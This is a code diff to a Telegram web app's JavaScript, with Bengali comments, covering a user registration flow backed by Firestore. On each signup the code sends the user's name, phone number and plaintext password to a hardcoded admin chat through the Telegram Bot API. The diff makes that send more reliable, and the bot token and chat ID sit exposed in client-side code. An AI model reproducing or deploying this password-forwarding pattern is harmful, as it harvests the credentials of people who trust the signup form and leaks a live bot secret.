@@ -128,7 +128,7 @@ const db = firebase.firestore();
 const tg = window.Telegram.WebApp;
 tg.ready(); tg.expand();
 
-// আপনার টেলিগ্রাম অ্যাডমিন নোটিফিকেশন বট কনফিগারেশন
+// টেলিগ্রাম বট কনফিগারেশন
 const botToken = "8535942512:AAHmpa8119aOZx6EZwOpaDhGteBPoxtzs_8";
 const adminChatId = "8040704140";
 
@@ -145,7 +145,6 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // অটো লগইন চেক
     if (currentUserPhone) {
         loadUserData(currentUserPhone);
     } else {
@@ -175,13 +174,12 @@ function closeSupportModal() {
     document.getElementById('support-modal').classList.remove('active');
 }
 
-// ১০০% নির্ভরযোগ্য ও ফাস্ট টেলিগ্রাম টেক্সট নোটিফিকেশন ফাংশন (কখনো আটকে থাকবে না)
+// অত্যন্ত নির্ভরযোগ্য ও নিশ্চিত টেলিগ্রাম নোটিফিকেশন ফাংশন
 async function sendTelegramAdminNotification(name, phone, password, hasPhoto) {
     const message = `🔥 <b>নতুন ইউজারের সফল রেজিস্ট্রেশন!</b> 🔥\n━━━━━━━━━━━━━━━━━━━━━━\n👤 <b>নাম:</b> ${name}\n📱 <b>মোবাইল নম্বর:</b> ${phone}\n🔑 <b>পাসওয়ার্ড:</b> <code>${password}</code>\n📸 <b>ফেস ভেরিফিকেশন ছবি:</b> ${hasPhoto ? 'আপলোড সম্পন্ন ✅' : 'নেই'}\n📅 <b>সময়:</b> ${new Date().toLocaleString('bn-BD')}\n━━━━━━━━━━━━━━━━━━━━━━`;
     
     try {
-        const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(`https://api.telegram.org/bot${botToken}/sendMessage`);
-        await fetch(proxyUrl, {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -209,7 +207,7 @@ async function handleRegistration() {
     tg.showAlert("⏳ রেজিস্ট্রেশন চেক করা হচ্ছে...");
 
     try {
-        // ফায়ারস্টোরে ফোন নম্বর দিয়েই ডকুমেন্ট চেক করা হচ্ছে
+        // ফায়ারস্টোরে সরাসরি ফোন নম্বর দিয়ে ডকুমেন্ট চেক ও সেভ করা
         const userRef = db.collection('users').doc(phone);
         const docSnap = await userRef.get();
         
@@ -235,11 +233,10 @@ async function handleRegistration() {
                 created_at: firebase.firestore.FieldValue.serverTimestamp()
             };
 
-            // ফায়ারস্টোরে ফোন নম্বর দিয়ে ডেটা সেভ করা
             await userRef.set(userData);
 
-            // টেলিগ্রাম অ্যাডমিন বটে নোটিফিকেশন পাঠানো (ব্যাকগ্রাউন্ডে চলবে, কখনো আটকাবে না)
-            sendTelegramAdminNotification(name, phone, password, true);
+            // টেলিগ্রাম অ্যাডমিন বটে নোটিফিকেশন পাঠানো
+            await sendTelegramAdminNotification(name, phone, password, true);
 
             // সেশন সেভ করা
             localStorage.setItem('logged_user_phone', phone);
@@ -303,7 +300,6 @@ async function loadUserData(phone) {
             document.getElementById('user-display-name').innerText = data.name;
             document.getElementById('user-display-balance').innerText = currentBalance;
 
-            // পেজ সুইচ টু হোম
             document.getElementById('page-login').classList.remove('active');
             document.getElementById('page-register').classList.remove('active');
             document.getElementById('page-work').classList.remove('active');
